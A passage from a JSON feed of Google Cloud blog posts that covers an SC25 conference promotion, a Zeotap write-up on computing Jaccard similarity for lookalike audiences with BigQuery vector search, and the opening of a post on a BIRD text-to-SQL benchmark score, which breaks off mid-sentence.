baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">, you\u2019ll see how AI can augment your capabilities and accelerate discovery.\u00a0</span></li>\n<li><strong style=\"vertical-align: baseline;\">AI-powered scientific applications: </strong><span style=\"vertical-align: baseline;\">Learn about the latest advancements in our AI-powered scientific applications including AlphaFold 3 and Weather Next</span></li>\n<li><strong style=\"vertical-align: baseline;\">The power of TPUs:</strong><span style=\"vertical-align: baseline;\"> Explore Google's </span><a href=\"https://cloud.google.com/tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TPUs</span></a><span style=\"vertical-align: baseline;\">, including the latest seventh-generation </span><a href=\"https://cloud.google.com/blog/products/compute/ironwood-tpus-and-new-axion-based-vms-for-your-ai-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Ironwood</span></a><span style=\"vertical-align: baseline;\"> model, and discover how they can enhance AI workload performance and efficiency.</span></li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Join the Google Cloud at SC25: </strong><span style=\"vertical-align: baseline;\">At Google Cloud, we believe the cloud is the supercomputer of the future. From purpose-built HPC and AI infrastructure to quantum breakthroughs and simplified open-source tools, let Google Cloud be the platform for your next discovery.</span></p>\n<p><span style=\"vertical-align: baseline;\">We invite you to connect with our experts and learn more. Join the </span><a href=\"https://sites.google.com/view/advancedcomputingcommunity/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Advanced Computing Community</span></a><span style=\"vertical-align: baseline;\"> to engage in discussions with our partners and the broader HPC, AI, and quantum communities.</span></p>\n<p><span style=\"vertical-align: baseline;\">We can\u2019t wait to see what you discover.</span></p>\n<p><strong style=\"vertical-align: baseline;\">See us at the show:</strong></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Visit us in booth #3724: </strong><span style=\"vertical-align: baseline;\">Stop by for live demos of our latest HPC and AI solutions, including Dynamic Workload Scheduler, Cluster Toolkit, our latest AI agents, and even see our TPUs. Our team of experts will be on hand to answer your questions and discuss how Google Cloud can meet your needs.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Attend our technical talks:</strong><span style=\"vertical-align: baseline;\"> Keep an eye on </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-sc-25\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our SC25 schedule</span></a><span style=\"vertical-align: baseline;\"> for Google Cloud presentations and technical talks, where our leaders and partners will share deep dives, insights, and best practices.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Passport program: </strong><span style=\"vertical-align: baseline;\">Grab a passport card from the Google booth and visit our demos, labs, and talks to collect stamps and learn about how we\u2019re working with organizations across the HPC ecosystem to democratize HPC. Come back to the Google booth with your completed passport card to choose your prize!</span></li>\n<li><strong style=\"vertical-align: baseline;\">Play a game:</strong><span style=\"vertical-align: baseline;\"> Join us in the Google booth and at our events to enjoy some Gemini-driven games \u2014 test your tech trivia knowledge or compete head-to-head with others to build the best LEGO creation!</span></li>\n<li><strong style=\"vertical-align: baseline;\">Join our community kickoff: </strong><span style=\"vertical-align: baseline;\">Are you a member of the Google Cloud Advanced Computing Community? Secure your spot today for our </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-advanced-computing-community-sc25\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SC25 Kickoff Happy Hour</span></a><span style=\"vertical-align: baseline;\">!</span></li>\n<li><strong style=\"vertical-align: baseline;\">Celebrate with NVIDIA and Google Cloud: </strong><span style=\"vertical-align: baseline;\">We\u2019re proud to co-host a </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-nvidia-sc25\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reception with NVIDIA</span></a><span style=\"vertical-align: baseline;\">, and we look forward to toasting another year of innovation with our customers and partners. Register today to secure your spot!</span></li>\n</ul></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/using-bigquery-ml-to-solve-for-the-lookalike-problem-at-zeotap/",
        "title": "Zeotap: How BigQuery ML and vector search help customers build their own AI models",
        "thumbnail": null,
        "author": "Sathish KS",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor\u2019s note:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> The post is part of a series that highlights how organizations leverage Google Cloud\u2019s unique data science capabilities over alternative cloud data platforms. Google Cloud's vector embedding generation and search features are unique for their end-to-end, customizable platform that leverages Google's advanced AI research, offering features like task-optimized embedding models and hybrid search to deliver highly relevant results for both semantic and keyword-based queries.</span></p>\n<hr />\n<p><span style=\"vertical-align: baseline;\">Zeotap\u2019s customer intelligence platform (CIP) helps brands understand their customers and predict behaviors, so that they can improve customer engagement. Zeotap partners with Google Cloud to build a customer data platform that offers privacy, security, and compliance. Zeotap CIP, built with BigQuery, enables digital marketers to build and use AI/ML models to predict customer behavior and personalize the customer experienc</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_t03FFBt.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The Zeotap platform includes a customer segmentation feature called lookalike audience extensions. A lookalike audience is a group of new potential customers identified by machine learning algorithms who share similar characteristics and behaviors with an existing, high-value customer base. However, sparse or incomplete first-party data can make it hard to create effective lookalike audiences, preventing advertising algorithms from accurately identifying the key characteristics of valuable customers that they need to find similar new prospects. For such rare features, Zeotap uses multiple machine learning (ML) methodologies that combine </span><a href=\"http://papers.adkdd.org/2021/papers/adkdd21-selvaraj-multigraph.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Zeotap\u2019s multigraph algorithm</span></a><span style=\"vertical-align: baseline;\"> and high-quality data assets to more accurately extend customers\u2019 audiences between the CDP and lookalike models.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this blog, we dive into how Zeotap uses BigQuery, including BigQuery ML and Vector Search to solve the end-to-end lookalike problem. </span><span style=\"vertical-align: baseline;\">By taking a practical approach, we transformed a complex nearest-neighbour problem into a simple inner-join problem, overcoming challenges of cost, scale and performance without a specialized vector database. </span><span style=\"vertical-align: baseline;\">We break down each step of the workflow, from data preparation to serving, highlighting how BigQuery addresses core challenges along the way. We illustrate one of the techniques, Jaccard similarity with embeddings, to address the low-cardinality categorical columns that dominate user-profile datasets.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The high-level flow is as follows, and happens entirely within the BigQuery ecosystem. Note: In this blog, we will not be covering the flow of high-cardinality columns.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_viuso9A.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Jaccard similarity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Among a couple of other similarity indexes, which return the most similar vector that are closest in embedding space, Zeotap prefers the Jaccard similarity to be a fitting index for low-cardinality features, which is a measure of overlap between two sets with a simple formula: </span><span style=\"vertical-align: baseline;\">(A </span><span style=\"vertical-align: baseline;\">B) / (A</span><span style=\"vertical-align: baseline;\">B)</span><span style=\"vertical-align: baseline;\">. The Jaccard similarity</span><span style=\"vertical-align: baseline;\"> answers the question, \"Of all the unique attributes present in either of the two users, what percentage of them are shared?\" It only cares about the features that are present in at least one of the entities (e.g., the 1s in a binary vector) and ignores attributes that are absent in both.</span></p>\n<p><span style=\"vertical-align: baseline;\">To visualise:</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Users</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Interests</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Binary Vectors[Movie, Sport, Music, Books, Travel]</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">X\u2229B</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Jaccard similarity with X</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">X</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[Movie, Sport]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[1,1,0,0,0]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">-</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">-</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Y</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[Movie, Sport]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[1,1,0,0,0]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2/2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Z</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[Movie, Sport, Music, Books, Travel]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">[1,1,1,1,1]</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2/5</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><span style=\"vertical-align: baseline;\">Jaccard similarity shines because it is simple and easily explainable over many other complex distance metrics and similarity indexes that only measure distance in the embeddings space \u2014 a real Occam\u2019s razor, as it were.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Implementation blueprint</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">Generating the vector embeddings<br /></strong><span style=\"vertical-align: baseline;\">After selecting the low-cardinality features, we </span><span style=\"vertical-align: baseline;\">create our vectors </span><span style=\"vertical-align: baseline;\">using BigQuery </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-one-hot-encoder?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">one-hot encoding</span></a><span style=\"vertical-align: baseline;\"> and</span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-multi-hot-encoder?hl=en\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">multi-hot encoding</span></a><span style=\"vertical-align: baseline;\"> for primitive and array-based columns.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Again, it helps to visualize a sample vector table:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_HYyDAga.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Challenge: Jaccard distance is not directly supported in BigQuery vector search!</strong></p>\n<p><span style=\"vertical-align: baseline;\">BigQuery vector search supports three distance types: </span><a href=\"https://en.wikipedia.org/wiki/Euclidean_distance\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Euclidean</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://en.wikipedia.org/wiki/Cosine_similarity#Cosine_distance\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cosine</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://en.wikipedia.org/wiki/Dot_product\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dot product</span></a><span style=\"vertical-align: baseline;\">, but not Jaccard distance \u2014 at least not natively. However, we can represent the choice of binary vectors where the Jaccard Distance (1 - Jaccard Similarity)\u00a0 as:\u00a0</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Jd(A,B) = 1 - |A\u2229B|/|A\u222aB| = (|A\u222aB| - |A\u2229B|)/|A\u222aB|</span></p>\n<p><span style=\"vertical-align: baseline;\">Using only the dot product, this can be rewritten as:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_6ZFqrE0.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">So we can, in fact, arrive at the Jaccard distance using the dot product. We found BigQuery\u2019s out-of-the-box </span><strong style=\"vertical-align: baseline;\">LP_NORM</strong><span style=\"vertical-align: baseline;\"> function for calculating the</span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-lp-norm?hl=en\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Manhattan</span></a><span style=\"vertical-align: baseline;\"> norm useful, as the </span><strong style=\"vertical-align: baseline;\">Manhattan norm for a binary vector is the dot product with itself</strong><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">In other words, using the Manhattan norm function, we found that we can support the Jaccard distance in a way that it can be calculated using the supported \"dot product\" search in BigQuery.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Building the vector index</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Next, we needed to build our vector index. BigQuery supports two primary vector index types: </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#ivf-index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IVF</span></a><span style=\"vertical-align: baseline;\"> (Inverted File Index) and </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#tree-ah-index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TREE_AH</span></a><span style=\"vertical-align: baseline;\"> (Tree with Asymmetric Hashing), each tailored to different scenarios. </span><span style=\"vertical-align: baseline;\">The </span><span style=\"vertical-align: baseline;\">TREE_AH</span><span style=\"vertical-align: baseline;\"> vector index type combines a tree-like structure with asymmetric hashing (</span><span style=\"vertical-align: baseline;\">AH</span><span style=\"vertical-align: baseline;\">), based on</span><a href=\"https://github.com/google-research/google-research/blob/master/scann/docs/algorithms.md\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">Google\u2019s ScaNN algorithm</span></a><span style=\"vertical-align: baseline;\">, which has performed exceptionally well on various</span><a href=\"https://ann-benchmarks.com/index.html\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">ANN benchmarks</span></a><span style=\"vertical-align: baseline;\">. Also, since the use case was for large batch queries (e.g., hundreds of thousands to millions of users), this offered reduced latency and cost compared to alternate vector databases.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Lookalike delivery</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Once we had a vector index to optimize searches, we asked ourselves, \u201cShould we run our searches directly using the </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/search_functions#vector_search\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VECTOR_SEARCH</span></a><span style=\"vertical-align: baseline;\"> function in BigQuery?\u201d Taking this approach over the base table yielded a whopping 118 million user-encoded vectors for just one client! Additionally, and most importantly, since this computation called for a </span><a href=\"https://en.wikipedia.org/wiki/Cartesian_product\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cartesian product</span></a><span style=\"vertical-align: baseline;\">, our in-memory data sizes became very large and complex quickly. We needed to devise a strategy that would scale to all customers.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The rare feature strategy</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A simple but super-effective strategy is to </span><strong style=\"vertical-align: baseline;\">avoid searching for ubiquitous user features. </strong><span style=\"vertical-align: baseline;\">In a two-step rare-feature process, we identify the \u201comnipresent\u201d features, then proceed to create a signal-rich table that includes users who possess at least one of the rarer/discriminative features. Right off the bat, we achieved up to 78% reduction in search space. BigQuery VECTOR_SEARCH allows you to do this with </span><strong style=\"vertical-align: baseline;\">pre-filtering, </strong><span style=\"vertical-align: baseline;\">wherein you use a subquery to dynamically shrink the search space. The catch is that the subquery cannot be a classic join, so we introduce a \u201cflag\u201d column and make it part of the index. </span><strong style=\"vertical-align: baseline;\">Note:</strong><span style=\"vertical-align: baseline;\"> If a column is not stored in the index, then the WHERE clause in the VECTOR_SEARCH will execute a </span><a href=\"https://docs.cloud.google.com/bigquery/docs/vector-index#pre-filters_and_post-filters\"><span style=\"text-decoration: underline; vertical-align: baseline;\">post-filter</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_zdPwyaH.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Use the BQUI or system tables to see if a vector is used to accelerate queries</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Batch strategy</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Vector search compares query users (N, the users we\u2019re targeting) against base users (M, the total user pool, in this case 118M). The complexity increases with (M \u00d7 N), making large-scale searches resource-intensive. To manage this, we applied batches to the N query users, processing them in groups (e.g., 500,000 per batch), while M remained the full base set. This approach reduced the computational load, helping to efficiently match the top 100 similar users for each query user.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">We then used grid search to determine the optimal batch size for high-scale requirements.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">To summarize</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We partnered with Google Cloud to enable digital marketers to build and use AI/ML models for customer segmentation and personalized experiences, driving higher conversion rates and lower acquisition costs. We addressed the challenge of Jaccard distance not being directly supported in BigQuery Vector Search by using the dot product and Manhattan norm. This practical approach, leveraging BigQuery ML and vector offerings, allowed us to create bespoke lookalike models with just one single SQL script and overcome challenges of cost, scale, and performance without a specialized vector database.</span></p>\n<p><span style=\"vertical-align: baseline;\">Using BigQuery ML and vector offerings, coupled with its robust, serverless architecture, we were able to release bespoke lookalike models catering to individual customer domains and needs. Together, Zeotap and Google Cloud look forward to partnering to help marketers expand their reach everywhere.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The Built with BigQuery advantage for ISVs and data providers</strong></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Built with BigQuery helps companies like Zeotap build innovative applications with Google Data Cloud. Participating companies can:</span></p>\n<ul>\n<li style=\"font-style: italic; vertical-align: baseline;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Accelerate product design and architecture through access to designated experts who can provide insight into key use cases, architectural patterns, and best practices.</span></p>\n</li>\n<li style=\"font-style: italic; vertical-align: baseline;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Amplify success with joint marketing programs to drive awareness, generate demand, and increase adoption.</span></p>\n</li>\n</ul>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">BigQuery gives ISVs the advantage of a powerful, highly scalable unified Data Cloud for the agentic era, that\u2019s integrated with Google Cloud\u2019s open, secure, sustainable platform. </span><a href=\"https://cloud.google.com/solutions/data-cloud-isvs\"><span style=\"font-style: italic; vertical-align: baseline;\">Click here to learn more about Built with BigQuery.</span></a></p></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/how-to-get-gemini-to-deeply-understand-your-database/",
        "title": "A new top score: Advancing Text-to-SQL on the BIRD benchmark",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Hero_image_Echo_1_RGB.max-600x600.png",
        "author": "Tom Kubik",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In the fast-evolving world of agentic development, natural language is becoming the standard for interaction. This shift is deeply connected to the power of operational databases, where a more accurate text-to-SQL capability is a major catalyst for building better, more capable agents. </span><span style=\"vertical-align: baseline;\">From empowering non-technical users to self-serve data, to accelerating analyst productivity, the ability to accurately translate natural language questions into SQL is a game-changer. As end-user engagements increasingly happen over chat, conversations become the fundamental connection between businesses and their customers</span><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In an earlier post, \"</span><a href=\"https://cloud.google.com/blog/products/databases/techniques-for-improving-text-to-sql\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Getting AI to write good SQL: Text-to-SQL techniques explained</span></a><span style=\"vertical-align: baseline;\">,\" we explored the core </span><span style=\"font-style: italic; vertical-align: baseline;\">challenges</span><span style=\"vertical-align: baseline;\"> of text-to-SQL \u2014 handling complex business context, ambiguous user intent, and subtle SQL dialects \u2014 and the general </span><span style=\"font-style: italic; vertical-align: baseline;\">techniques</span><span style=\"vertical-align: baseline;\"> used to solve them.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we're moving from theory to practice. We're excited to share that Google Cloud has scored a new state-of-the-art result</span><strong style=\"vertical-align: baseline;\"> on the </strong><a href=\"https://bird-bench.github.io/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">BIRD</strong></a><strong style=\"vertical-align: baseline;\"> benchmark's Single Trained Model Track.</strong><span style=\"vertical-align: baseline;\"> We scored 76.13, ahead of any other single-model solution (higher is better). In general, the closer you get to the benchmark of human performance (92.96), the harder it is to score incremental gains.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">BIRD (BIg Bench for LaRge-scale Database Grounded Text-to-SQL Evaluation) is an industry standard for testing text-to-SQL solutions. BIRD spans over 12,500 unique question-SQL pairs from 95 databases with a total size of 33 GB. The Single Trained Model Track is designed to measure the raw, intrinsic capability of the model itself, restricting the use of complex preprocessing, retrieval, or agentic frameworks often used to boost model accuracy. In other words, success here reflects an advancement in the model's core ability to generate SQL.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - BIRD leaderboard result\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_ur0KlJx.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Gemini scores #1 place in BIRD (October \u201825)</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">From research to industry-leading products</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This leap in more accurate natural-language-to-SQL capability, often referred to as NL2SQL, isn't just an internal research or engineering win; it fundamentally elevates the customer experience across several key data services,and our state-of-the-art research in this field is enabling us to create industry-leading products that customers leverage to activate their data with agentic AI.</span></p>\n<p><span style=\"vertical-align: baseline;\">Consider </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/natural-language-landing\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI\u2019s natural language capability</strong></a><span style=\"vertical-align: baseline;\">, a tool that customers use to allow end users to query the most current operational data using natural language. For instance, companies like Hughes, an Echostar Corporation, depend on AlloyDB\u2019s NL2SQL for critical tasks like call analytics. Numerous other retail, technology, and industry players also integrate this capability into their customer-facing applications. With NL2SQL that is near-100% accurate, customers gain the confidence to build and deploy applications in production workloads that rely on real-time data access.</span></p>\n<p><span style=\"vertical-align: baseline;\">The benefits of NL2SQL extend to analysis, as exemplified with </span><a href=\"https://docs.cloud.google.com/bigquery/docs/conversational-analytics\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">conversational analytics in BigQuery</strong></a><span style=\"vertical-align: baseline;\">. This service lets business users and data analysts explore data, run reports, and extract business intelligence from vast historical datasets using natural language. The introduction of a multi-turn chat experience, combined with a highly accurate NL2SQL engine, helps them make informed decisions with the confidence that the responses from BigQuery-based applications are consistently accurate.</span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, developers are finding new efficiencies. They have long relied on </span><a href=\"https://docs.cloud.google.com/alloydb/docs/write-sql-gemini\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Code Assist (GCA)</strong></a><span style=\"vertical-align: baseline;\"> for code generation, aiding their application development with databases across Spanner, AlloyDB, and Cloud SQL Studio. With the availability of more accurate NL2SQL, developers will be able to use AI coding assistance to generate SQL code too.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">BIRD: a proving ground for core model capability</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">BIRD benchmark </strong><span style=\"vertical-align: baseline;\">is one of the most commonly used benchmarks in the text-to-SQL field. It moves beyond simple, single-table queries to cover real-world</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">challenges our models must handle, such as reasoning over very large schemas</span><strong style=\"vertical-align: baseline;\">,</strong><span style=\"vertical-align: baseline;\"> dealing with ambiguous values, and incorporating external business knowledge. Crucially, BIRD measures a critical standard: </span><strong style=\"vertical-align: baseline;\">execution-verified accuracy</strong><span style=\"vertical-align: baseline;\">. This means a query is not just considered 'correct' if it appears right; it must also successfully run and return the correct data.</span></p>\n<p><span style=\"vertical-align: baseline;\">We specifically targeted the Single Trained Model Track because it allows us to isolate and measure the model's core ability to solve the text-to-SQL task (rather than an ensemble, a.k.a., a system with multiple components such as multiple parallel models, re-rankers, etc.). This distinction is critical, as text-to-SQL accuracy can be improved with techniques like dynamic few-shot retrieval or schema preprocessing; this track reflects the model's true reasoning power. By focusing on a single-model solution, these BIRD results demonstrate that enhancing the core model creates a stronger foundation for systems built on top of it.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Our method: Specializing the model</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Achieving a state-of-the-art score doesn't happen only by using a powerful base model. The key is to </span><span style=\"font-style: italic; vertical-align: baseline;\">specialize</span><span style=\"vertical-align: baseline;\"> the model. We developed a </span><span style=\"vertical-align: 